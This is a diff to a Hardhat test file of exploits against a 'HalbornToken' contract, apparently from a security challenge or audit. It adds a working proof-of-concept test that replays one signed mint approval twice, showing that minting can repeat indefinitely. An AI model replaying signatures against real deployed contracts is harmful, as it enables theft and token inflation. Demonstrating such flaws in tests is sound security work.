@@ -1,8 +1,13 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+async function advance_time(time_s){
+	await ethers.provider.send('evm_increaseTime', [time_s]);
+	await ethers.provider.send('evm_mine', []);
+}
+
 describe('[HalbornToken] Exploits', function() {
-	let attacker, employees;
+	let steve, attacker, employees;
 
 	beforeEach(async function() {
 		[steve, alice, bob, charlie, david, whitelisted, attacker] = await ethers.getSigners();
@@ -12,7 +17,7 @@ describe('[HalbornToken] Exploits', function() {
 		let whitelistedHash = ethers.utils.solidityKeccak256(['address'], [whitelisted.address]);
 		
 		// Create bytes32 proof from a "password" 
-		let proof = ethers.utils.keccak256(ethers.utils.id("S3CUR3_PR00F"));
+		let proof = ethers.utils.keccak256(ethers.utils.id('S3CUR3_PR00F'));
 		
 		// Root is keccak256 of the whitelisted address hash and "password" proof that will pass the 'verify' function
 		let root = ethers.utils.solidityKeccak256(
@@ -24,8 +29,8 @@ describe('[HalbornToken] Exploits', function() {
 		// Steve deploy the contract
 		let deployerFunds = ethers.utils.parseEther('10000');
 		this.token = await (await ethers.getContractFactory('HalbornToken', steve)).deploy(
-			"HalbornToken", // Name
-			"HAL", // Symbol
+			'HalbornToken', // Name
+			'HAL', // Symbol
 			deployerFunds, // Minted amount for deployer Steve
 			steve.address, // Deployer address
 			root
@@ -76,5 +81,34 @@ describe('[HalbornToken] Exploits', function() {
 		expect(
 			await this.token.balanceOf(attacker.address)
 		).to.be.equal(attackerFunds);
+	});
+
+	it('[Exploit #2] \'mintTokensWithSignature\' is vulnerable to replay attacks', async function() {
+		let alice = employees[0];
+		let signedAmount = ethers.utils.parseEther('100');
+
+		// Message that will be signed by Steve, the deployer
+		let msgHash = ethers.utils.solidityKeccak256(['bytes32', 'uint256', 'bytes32'], [
+			"0x" + "00".repeat(12) + this.token.address.slice(2), // Pad the address as the signature recovery expects standard encoded values (abi.encode)
+			signedAmount, 
+			"0x" + "00".repeat(12) + alice.address.slice(2)
+		]);
+		// Steve sign the message approving Alice for minting 100 tokens
+		let signedMsg = await steve.signMessage(ethers.utils.arrayify(msgHash));
+
+		const r = signedMsg.slice(0, 66);
+		const s = '0x' + signedMsg.slice(66, 130);
+		const v = '0x' + signedMsg.slice(130, 132);
+
+		let balance =  await this.token.balanceOf(alice.address);
+		await (await this.token.connect(alice)).mintTokensWithSignature(signedAmount, r, s, v);
+		expect (
+			await this.token.balanceOf(alice.address)
+		).to.be.equal(balance.add(signedAmount)); // Alice minted the 100 tokens
+
+		await (await this.token.connect(alice)).mintTokensWithSignature(signedAmount, r, s, v);
+		expect (
+			await this.token.balanceOf(alice.address)
+		).to.be.equal(balance.add(signedAmount.mul(2))); // Alice can mint again though, indefinitely !
 	});
 });
